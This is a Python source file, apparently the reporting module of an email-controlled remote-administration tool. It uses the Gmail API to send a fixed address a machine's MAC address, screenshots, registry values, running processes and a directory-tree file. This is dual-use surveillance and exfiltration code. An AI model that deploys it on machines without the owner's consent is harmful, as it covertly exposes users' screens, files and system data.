import base64
import mimetypes
import pyautogui
import os

from Google import Create_Service

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


CLIENT_SECRET_FILE = 'secret_file.json'
API_NAME = 'gmail'
API_VERSION = 'v1'
SCOPES = ['https://mail.google.com/']

service = Create_Service(CLIENT_SECRET_FILE, API_NAME, API_VERSION, SCOPES)

def sendMACResult(content):
    emailMsg = content
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'MAC address'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()

def sendShutdownResult():
    emailMsg = "Shutdown success :)"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'Shutdown'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()

def sendLogoutResult():
    emailMsg = "Logout success :)"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'Logout'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()

def sendSaveRegistryResult():
    emailMsg = "Registry saved success :)"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'Save registry'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()
    
def sendLiveScreenResult(file_attachment):
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(file_attachment)
    emailMsg = 'Livescreen image'
    
    # create email message
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = 'test0511mail@gmail.com'
    mimeMessage['subject'] = 'Livescreen'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    
    # Attach files
    content_type, encoding = mimetypes.guess_type(file_attachment)
    main_type, sub_type = content_type.split('/', 1)
    file_name = os.path.basename(file_attachment)
    
    f = open(file_attachment, 'rb')
    
    myFile = MIMEBase(main_type, sub_type)
    myFile.set_payload(f.read())
    myFile.add_header('Content-Disposition', 'attachment', filename=file_name)
    encoders.encode_base64(myFile)
    
    f.close() 
    
    mimeMessage.attach(myFile)  
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()  
    message = service.users().messages().send(
        userId='me',
        body={'raw': raw_string}).execute()
    
def sendSaveRegistryResult():
    emailMsg = "Registry saved success :)"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'Save registry'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()

    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()

def sendLoadRegistryResult(values):
    emailMsg = ""
    for name, value in values.items():
        emailMsg += f"{name}: {value}\n"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'Load registry'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()
    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()


def sendAppProcessResult(process_list):
    emailMsg = ""
    for process in process_list:
        emailMsg += f"{process['id']}\t{process['name']}\n"
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = "test0511mail@gmail.com"
    mimeMessage['subject'] = 'App process'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()
    message = service.users().messages().send(userId='me', body={'raw': raw_string}).execute()


def sendDirectoryTreeResult(tree_file):
    emailMsg = 'Directory tree'
    
    # create email message
    mimeMessage = MIMEMultipart()
    mimeMessage['to'] = 'test0511mail@gmail.com'
    mimeMessage['subject'] = 'Directory tree'
    mimeMessage.attach(MIMEText(emailMsg, 'plain'))
    
    # Attach files
    content_type, encoding = mimetypes.guess_type(tree_file)
    main_type, sub_type = content_type.split('/', 1)
    file_name = os.path.basename(tree_file)
    
    f = open(tree_file, 'rb')
    
    myFile = MIMEBase(main_type, sub_type)
    myFile.set_payload(f.read())
    myFile.add_header('Content-Disposition', 'attachment', filename=file_name)
    encoders.encode_base64(myFile)
    
    f.close()

    if os.path.exists(tree_file):
        os.remove(tree_file)
    
    mimeMessage.attach(myFile)
    
    raw_string = base64.urlsafe_b64encode(mimeMessage.as_bytes()).decode()
    
    message = service.users().messages().send(
        userId='me',
        body={'raw': raw_string}).execute()